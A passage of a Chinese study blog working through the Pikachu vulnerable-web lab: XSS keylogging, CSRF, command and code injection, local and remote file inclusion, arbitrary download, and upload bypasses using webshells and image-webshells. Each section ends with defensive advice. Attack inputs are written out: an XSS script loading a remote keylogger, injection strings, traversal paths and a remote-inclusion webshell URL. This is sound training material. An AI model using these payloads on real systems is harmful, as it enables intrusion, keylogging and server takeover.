data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-42-08.png" alt="tips" class="lazyload"><br>演示之前需要修改文件<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-46-47.png" alt="修改" class="lazyload"><br>演示：<br>打开存储型xss，我们输入payload来加载xss平台的js代码插入到页面</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;script src=<span class="hljs-string">&quot;http://192.168.23.128/pikachu/pkxss/rkeypress/rk.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-21-13-19.png" alt="演示" class="lazyload"></p>
<p>解决跨域请求页面问题<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-20-56-27.png" alt="跨域" class="lazyload"><br>修改页面重启服务清空浏览器缓存，重新输入查看键盘记录<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-11-21-28-28.png" alt="成功记录" class="lazyload"></p>
<h4 id="XSS常见防范措施"><a href="#XSS常见防范措施" class="headerlink" title="XSS常见防范措施"></a>XSS常见防范措施</h4><p>总的原则:输入做过滤,输出做转义：</p>
<ul>
<li>过滤:根据业务需求进行过滤，比如输入点要求输入手机号，则只允许输入手机号格式的数字</li>
<li>转义:所有输出到前端的数据都根据输出点进行转义,比如输出到html中进行htm|实体转义,输入到JS里面的进行js转义。</li>
</ul>
<h3 id="CSRF（跨站请求伪造漏洞）"><a href="#CSRF（跨站请求伪造漏洞）" class="headerlink" title="CSRF（跨站请求伪造漏洞）"></a>CSRF（跨站请求伪造漏洞）</h3><h4 id="csrf漏洞概述"><a href="#csrf漏洞概述" class="headerlink" title="csrf漏洞概述"></a>csrf漏洞概述</h4><p>cross-site request forgery（csrf跨站请求伪造）。在csrf攻击中，攻击者会伪造一个请求（一般是一个链接），欺骗用户点击，用户一旦点击整个攻击就完成了，所以也叫one click攻击。<br>例子：A用户在某网站的信息修改页面修改完信息点击提交即可修改成功，修改的链接地址为：<a href="http://#/csrf_mem_">http://#/csrf_mem_</a> edit.php?sex= 女&amp;phonenum= 12345678922&amp;add=地球村504号&amp;email=lucy@pi ka’ chu.com&amp;submit=submit<br>这时攻击者B想修改A的用户信息如何完成？必须需要有A的权限，修改个人信息的请求<br>攻击者B注册该网站抓包获取到修改信息的请求，然后伪造一个请求地址为<a href="http://#/csrf">http://#/csrf</a> mem. edit.php?sex=女&amp;phonenum= 13856564455&amp;add=火星村111号&amp;email=<a href="mailto:&#108;&#x75;&#99;&#x79;&#64;&#x70;&#x69;&#x6b;&#x61;&#x63;&#x68;&#x75;&#46;&#99;&#111;&#109;">&#108;&#x75;&#99;&#x79;&#64;&#x70;&#x69;&#x6b;&#x61;&#x63;&#x68;&#x75;&#46;&#99;&#111;&#109;</a>&amp;tsubmit=submit引诱A在登录的情况下点击，此时攻击就完成了。<br><strong>攻击成功的条件</strong></p>
<ol>
<li>网站对个人信息修改的请求没有做csrf处理，导致该请求容易伪造。因此在判断一个网站是否存在csrf漏洞其实就是判断其对关键信息的操作（增删改）是否易伪造</li>
<li>A要登录的情况下点击伪造请求，若未登录或没有点击伪造请求链接则攻击不会成功</li>
</ol>
<p><strong>csrf和xss的区别</strong></p>
<ul>
<li>如果攻击者B在网页中发现了xss漏洞他的做法是：</li>
</ul>
<ol>
<li>欺骗A访问埋伏了xss脚本（盗取cookie信息的脚本）的页面</li>
<li>A中招，B获取到A的cookie</li>
<li>B顺利登录到A的后台进行修改</li>
</ol>
<ul>
<li>csrf是借用用户权限完成攻击，攻击者并没有获取到用户权限，而xss是直接获取到用户权限进行破坏。</li>
</ul>
<p>如何确认一个web系统是否存在csrf漏洞：</p>
<ol>
<li><p>对目标网站增删改的地方进行标记观察逻辑判断请求是否可以被伪造</p>
<ul>
<li>如修改管理员账号时不需要验证旧的密码容易导致请求伪造</li>
<li>如对敏感信息修改并没有使用安全的token验证导致请求容易被伪造</li>
</ul>
</li>
<li><p>确认凭证的有效期（这个问题会提高csrf被利用的概率）<br>虽然退出或者关闭了浏览器,但cookie仍然有效，或者session并没有及时过期,导致CSRF攻击变的简单。</p>
</li>
</ol>
<h4 id="scrf（get-post）演示和解析"><a href="#scrf（get-post）演示和解析" class="headerlink" title="scrf（get/post）演示和解析"></a>scrf（get/post）演示和解析</h4><p>csrfget：<br>打开靶场的csrfget，我们假设是lucy登录网站修改信息<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-11-27.png" alt="登录" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-16-37.png" alt="修改信息" class="lazyload"><br>我们修改信息并抓包查看数据<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-15-47.png" alt="数据包" class="lazyload"><br>这是我们的请求：GET /pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=12345678922&amp;add=usaccca&amp;email=lucy%40pikachu.com&amp;submit=submit 在这里并没有看到csrf的token说明并没有防csrf的措施<br>我们修改请求，将地址修改为shanxi的请求如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs url">http://192.168.23.128/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=12345678922&amp;add=shanxi&amp;email=lucy%40pikachu.com&amp;submit=submit<br></code></pre></td></tr></table></figure>

<p>现在只需要将这个地址通过聊天或者信息的方式发送给lucy，lucy进行访问，信息的地址就会更新成shanxi<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-26-24.png" alt="地址更新" class="lazyload"></p>
<p>post型因为是请求体，不能在url中携带参数所以需要和xss的post型类似需要自己弄一个站点做一个表单让lucy点击访问我们恶意站点表单页面，向页面提交post请求<br>post演示<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-37-22.png" alt="抓包查看参数信息" class="lazyload"><br>然后我们在服务自己搭建的服务器上搭建一个表单以post方式提交的页面<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-50-55.png" alt="页面" class="lazyload"><br>我们构造一个链接：<a target="_blank" rel="noopener" href="http://192.168.23.128/pikachu/vul/csrf/post.html">http://192.168.23.128/pikachu/vul/csrf/post.html</a>将他发送给lili，在lili登录的情况下点击了该链接攻击完成<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-11-52-57.png" alt="攻击完成" class="lazyload"><br>可以看到信息被修改了</p>
<h4 id="反csrf-token"><a href="#反csrf-token" class="headerlink" title="反csrf token"></a>反csrf token</h4><p>csrf的主要问题是敏感操作的链接容易被伪造，只要每次请求都加上一个随机号码（够随机，难伪造）后端每次对这个号码进行检验，这个随机号码就是token，生成token的代码如下<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-12-36-56.png" alt="代码" class="lazyload"></p>
<h4 id="常见CSRF防范措施"><a href="#常见CSRF防范措施" class="headerlink" title="常见CSRF防范措施"></a>常见CSRF防范措施</h4><ul>
<li>增加token验证(常用的做法):</li>
</ul>
<ol>
<li>对关键操作增加token参数，token值必须随机，每次都不一样</li>
</ol>
<ul>
<li>关于安全的会话管理(避免会话被利用) :</li>
</ul>
<ol>
<li>不要在客户端端保存敏感信息(比如身份认证信息)</li>
<li>测试直接关闭，退出时的会话过期机制</li>
<li>设置会话过期机制，比如15分钟内无操作，则自动登录超时</li>
</ol>
<ul>
<li>访问控制安全管理</li>
</ul>
<ol>
<li>敏感信息的修改时需要对身份进行二次认证，比如修改账号时,需要判断旧密码</li>
<li>敏感信息的修改使用post，而不是get</li>
<li>通过http头部中的referer来限制原页面</li>
</ol>
<ul>
<li>增加验证码：一般用在登录(防暴力破解) ,也可以用在其他重要信息操作的表单中(需要考虑可用性)</li>
</ul>
<h3 id="REC（代码-命令执行）"><a href="#REC（代码-命令执行）" class="headerlink" title="REC（代码/命令执行）"></a>REC（代码/命令执行）</h3><p><strong>remote command/code execute（REC）概述：</strong>rec漏洞可以让攻击者直接向后台服务器远程注入操作系统命令或代码直接控制后台系统。<br><strong>远程系统命令执行：</strong>一般出现这种漏洞是因为应用系统从设计上需要给用户提供指定的远程命令操作接口，如常见的路由器、防火请、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。现在很多企业都开始实施自动化运维，大量的系统操作会通过自动化运维平台进行操作， 在这种平台上往往会出现远程系统命令执行的漏洞。<br>远程代码执行同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。<br>打开pikachu靶场exec “ping”我们来尝试一下输入127.0.0.1点击ping<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-23-34.png" alt="尝试" class="lazyload"><br>可以看到出现了命令结果，但结果有乱码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-47-51.png" alt="后端代码" class="lazyload"><br>如果后端没有做严格的过滤我们就可以拼接其他命令进行操作，如输入127.0.0.1 &amp; ipconfig点击ping就可以看到提交目标的IP了，也可以拼接一些其他命令进行尝试<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-29-50.png" alt="利用" class="lazyload"></p>
<p>远程代码执行命令<br>打开pikachu的exec “evel”进行尝试：这个更简单随意输入字符串，返回文字。eval（输入）也就是执行任何我们输入的命令如phpinfo();<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-50-28.png" alt="后端代码" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-34-35.png" alt="成功执行" class="lazyload"><br>这里学习一个php函数system(“”)执行外部程序并显示输出。<br>如输入system(“ipconfig”);点击提交成功返回目标IP<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-13-37-36.png" alt="尝试system函数" class="lazyload"></p>
<p>因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法</p>
<h3 id="file-inclusion（文件包含漏洞）"><a href="#file-inclusion（文件包含漏洞）" class="headerlink" title="file inclusion（文件包含漏洞）"></a>file inclusion（文件包含漏洞）</h3><h4 id="文件包含原理以及本地文件包含漏洞"><a href="#文件包含原理以及本地文件包含漏洞" class="headerlink" title="文件包含原理以及本地文件包含漏洞"></a>文件包含原理以及本地文件包含漏洞</h4><p><strong>文件包含漏洞概述</strong><br>在web开发时程序员为了让提高效率然代码重复利用率提高，使代码看起啦更简洁，会使用“包含’的函数功能。如：把一些列公用的函数写到function.php中，当其他文件需要相关函数时只需要将function.php在文件头部包含就可以调用相关函数了。但有时因网站功能需求，会让前端用户选择需要包含的文件或者在前端的功能中使用了”包含”功能，又由于开发人员没有对要包含的这个文件进行安全考虑,就导致攻击者可以通过修改包含文件的位置来让后台执行任意文件(代码)。这种情况我们称为”文件包含漏洞”<br>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。<br>文件包含漏洞分为两种本地文件包含漏洞和远程文件包含漏洞<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-14-16-47.png" alt="文件包含的两种形式" class="lazyload"><br><strong>本地文件包含：</strong>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br><strong>远程文件包含漏洞：</strong>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。<br>在php中可以使用include()或者require()语句包含文件，将一个php文件内容出入到另一个php文件中（在服务器执行它之前）还有include_once()和require_once()函数也可以进行文件包含<br>include和require语句相同除了错误处理方面：<br>require会生成致命错误( E_ COMPILE ERROR )并停止脚本<br>include只生成警告( E WARNING ) ,并且脚本会继续运行</p>
<p><strong>文件包含演示</strong><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-14-48-42.png" alt="演示" class="lazyload"></p>
<h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h4><p>打开pikachu靶场的fileinclude本地文件包含，点击下拉列表选择一个提交查询<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-14-53-28.png" alt="查看地址" class="lazyload"><br>可以看到地址栏显示的是一个文件file5.php按照设计这些文件都是后台自己存在的文件。但是由于这个文件名是前端传向后台的，也就意味着我们可以修改这个文件。我们可以猜测一下后台的操作系统是win11，其中有很多固定的配置文件例如…/…/…/…/…/…/可以多敲几个，最后都会跳到根目录。我们将文件名替换../../../../Windows/System32/drivers/etc/hosts可以看到hosts文件的内容在前端显示了<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-14-57-21.png" alt="包含hosts文件" class="lazyload"></p>
<h4 id="远程文件包含漏洞演示"><a href="#远程文件包含漏洞演示" class="headerlink" title="远程文件包含漏洞演示"></a>远程文件包含漏洞演示</h4><p>远程文件包含漏洞形式跟本地文件包含漏洞差不多,在远程包含漏洞中,攻击者可以通过访问外部地址来加载远程的代码。<br>远程包含漏洞前提:如果使用的incldue和require ,则需要php.ini配置如下：<br>allow_url_fopen=on//默认打开<br>Allow_url_include=on//默认关闭<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-05-52.png" alt="配置" class="lazyload"><br>写入一句话木马危害很大<br>配置好后我们打开靶场，点击一个文件提交<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-09-07.png" alt="远程文件包含" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-12-58.png" alt="地址特殊处" class="lazyload"><br>看地址栏观察url实际上是提交一个目标文件路径，我们改成一个远端的路径，读取远程文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">http://192.168.23.128/pikachu/test/yijuhua.txt<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-14-25.png" alt="访问" class="lazyload"><br>将靶场链接中的文件替换成远端链接文件(黑客搭建的服务器)修改后的链接如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">http://192.168.23.128/pikachu/vul/fileinclude/fi_remote.php?filename=http://192.168.23.128/pikachu/test/yijuhua.txt&amp;submit=%E6%8F%90%E4%BA%A4<br><br></code></pre></td></tr></table></figure>

<p>我们粘帖访问<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-20-01.png" alt="访问" class="lazyload"><br>会在服务器端的本地当前目录生成一个yijuhua.php传参为x<br>我们访问<a target="_blank" rel="noopener" href="http://192.168.23.128/pikachu/vul/fileinclude/yijuhua.php?x=ipconfig">http://192.168.23.128/pikachu/vul/fileinclude/yijuhua.php?x=ipconfig</a>这个链接就能成功获取到信息<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-27-09.png" alt="信息" class="lazyload"><br>也可以直接用哥斯拉、冰蝎、中国菜刀等工具直接链接一句话木马拿权限<br><strong>文件包含的防护</strong>在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤</p>
<ul>
<li>在功能设计上尽量不要将文件包含函数对应的文件放给前端进行选择和操作</li>
<li>过滤各种./. ,<a href="http://">http://</a> ，<a href="https://">https://</a></li>
<li>配置php.ini配置文件:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">allow_url fopen = off<br>Allow_ url include= off<br>magic quotes_ gpc=on //魔术引用将单引号反斜杠双引号null字符转义<br></code></pre></td></tr></table></figure>

<ul>
<li>通过白名单策略，仅允许包含运行指定的文件,其他的都禁止</li>
</ul>
<h3 id="Unsafe-file-downloads-不安全的文件下载漏洞"><a href="#Unsafe-file-downloads-不安全的文件下载漏洞" class="headerlink" title="Unsafe file downloads(不安全的文件下载漏洞)"></a>Unsafe file downloads(不安全的文件下载漏洞)</h3><p>很多网站提供文件下载功能，即用户可以通过点击下载链接下载对应文件。但文件下载功能设计的不合理则可能导致攻击者通过构造文件路径从而获取到后台服务器上的其他敏感文件（任意文件下载）<br>打开靶场的不安全的文件下载，正常功能点击球员名字就可以下载图片<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-51-29.png" alt="下载" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-52-35.png" alt="下载图片" class="lazyload"><br>查看下载链接的地址<a target="_blank" rel="noopener" href="http://192.168.23.128/pikachu/vul/unsafedownload/execdownload.php?filename=rayal.png">http://192.168.23.128/pikachu/vul/unsafedownload/execdownload.php?filename=rayal.png</a>相当于把ai.png传到后台，后台去找这个文件，把文件读取之后，传到前端下载。<br>我们点击科比，将url，改为ai.png<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-15-56-18.png" alt="ai下载" class="lazyload"><br>结果是下载了ai.png<br>我们还可以使用目录遍历的方式去修改链接下载敏感文件。<br><strong>防范措施：</strong></p>
<ol>
<li>对传入的文件名进行严格的过滤和限定</li>
<li>对文件下载的目录进行严格的限定</li>
</ol>
<h3 id="Unsafe-file-uploads-不安全的文件上传"><a href="#Unsafe-file-uploads-不安全的文件上传" class="headerlink" title="Unsafe file uploads(不安全的文件上传)"></a>Unsafe file uploads(不安全的文件上传)</h3><p>由于业务功能的需求很多网站都有文件上传的接口：</p>
<ol>
<li>注册时上传头像图片(如jpg、png、gif等)</li>
<li>上传文件附件(如doc、xls等)<br>如果后端开发时并没有对上传文件功能进行安全考虑或者采用有缺陷的措施导致攻击者可以通过某些手段绕过安全措施上传一些恶意文件（一句话木马）导致网站权限被获取</li>
</ol>
<p><strong>文件上传漏洞的测试流程</strong></p>
<ol>
<li>对文件上传的地方按照要求上传文件，查看返回结果(路径和提示等)</li>
<li>尝试上传不同类型的恶意文件，如xx.php文件分析结果</li>
<li>查看html源码，看是否在前端通过js做了限制可以绕过</li>
<li>尝试不同方式进行绕过:黑名单绕过、mime类型绕过、目录0x00截断绕过等</li>
<li>猜测或者结合其他漏洞（如敏感信息泄露等）得到木马路径链接测试</li>
</ol>
<p>打开靶场unsafe upfileupload客户端check我们浏览上传文件发现只能上传照片<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-17-30-03.png" alt="靶场" class="lazyload"><br>我们上传一个php脚本会提示上传文件不符合要求<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-17-33-16.png" alt="提示" class="lazyload"><br>上传其他类型的文件会被前端提示，有可能这个限制是前端实现的，打开源码查看<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-17-52-32.png" alt="源码" class="lazyload"><br>发现果然进行了限制，修改前端代码直接删除onchange的函数<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-17-55-24.png" alt="修改前端代码" class="lazyload"><br>继续上传php文件点击提交结果还是提示文件类型不符合要求，在网上查找发现可以通过禁用网站的javascript来绕过<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-28-40.png" alt="设置" class="lazyload"><br>选择脚本文件并上传<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-29-34.png" alt="上传脚本" class="lazyload">、<br>成功并且提示出上传路径，php文件一句话木马成功上传。之后就可以给特定值传命令，执行操作。</p>
<h4 id="文件上传漏洞之MINE-type验证原理"><a href="#文件上传漏洞之MINE-type验证原理" class="headerlink" title="文件上传漏洞之MINE type验证原理"></a>文件上传漏洞之MINE type验证原理</h4><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。<br>每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。常见的MIME类型，比如:<br>超文本标记语言文本.html.html texthtml<br>普通文本.txt text/plain<br>RTF文本.rtf application/rtf<br>GIF图形.gif image/gif<br>JPEG图形.ipeg.jpg image/jpeg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">通过使用PHP的全局数组$_ FILES ,你可以从客户计算机向远程服务器上传文件。<br>第一个参数是表单的input name，第二个下标可以是”name”, “type”, “size”, “tmp_ name” 或”error”<br></code></pre></td></tr></table></figure>

<p>同样先测试功能，上传图片没有问题，点击上传php文件提示出错<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-37-21.png" alt="上传" class="lazyload"><br>我们上传一个正常图片，然后在上传一个php文件，并且用burp抓包<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-41-56.png" alt="上传的数据包" class="lazyload"><br>上传图片显示上传成功，上传php文件失败，content-type显示的值不同我们将上传php文件的数据包发送到repeater中并将content-type的值改成图片的点击go<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-47-46.png" alt="修改数据包" class="lazyload"><br>文件上传成功<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-18-49-47.png" alt="成功绕过" class="lazyload"><br>通过http头的修改绕过了MINE type验证成功乱搞。之后就是访问传参，通过一句话木马控制服务器。</p>
<h4 id="文件上传之getimagesize绕过和防范"><a href="#文件上传之getimagesize绕过和防范" class="headerlink" title="文件上传之getimagesize绕过和防范"></a>文件上传之getimagesize绕过和防范</h4><p>Getimagesize()返回结果中有文件大小和文件类型,如果用这个函数来获取类型，从而判断是否是图片会存在问题<br>是否可以绕过？可以，图片头可以被伪造(图片马)<br>图片马的制作：</p>
<ul>
<li>直接伪造头部gif89A</li>
<li>cmd：copy /b test.jpg + muma.php ccc.phg</li>
<li>使用010edit神器或开源修图工具十六进制写入图片头，通过增加备注,写入执行命令</li>
</ul>
<p>制作图片马这里采用最简单的第二种方法：<br>cmd进入桌面，输入命令dir保证可以找到相关文件：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-19-32-20.png" alt="制作图片马" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-19-33-09.png" alt="图片马" class="lazyload"><br>打开展示无问题，但在图片16进制中添加了一句话木马，上传到靶场<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-19-34-53.png" alt="上传" class="lazyload"><br>可以看到上传成功，但我们访问并没有执行一句话，这时候就要结合本地文件包含漏洞来使用，打开文件包含漏洞file include，上传图片，修改路径，就可以执行phpinfo命令了<br>打开本地文件包含构造链接<a target="_blank" rel="noopener" href="http://192.168.23.128/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/03/12/660584640dbf7f8f024953420498.jpg&amp;submit=%E6%8F%90%E4%BA%A4">http://192.168.23.128/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/03/12/660584640dbf7f8f024953420498.jpg&amp;submit=%E6%8F%90%E4%BA%A4</a>访问会在当前目录生成shell.php然后访问执行代码，或者直接菜刀访问。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-12-20-06-02.png" alt="成功利用" class="lazyload"><br>命令成功执行</p>
<h4 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h4><p>不要在前端使用JS实施上传限制策略，通过服务端对上传文件进行限制:</p>
<ul>
<li>进行多条件组合检查:比如文件的大小，路径，扩展名,文件类型，文件完整性</li>
<li>对上传的文件在服务器上存储时进行重命名(制定合理的命名规则)</li>
<li>对服务器端上传文件的目录进行权限控制(比如只读)， 限制执行权限带来的危害</li>
</ul>
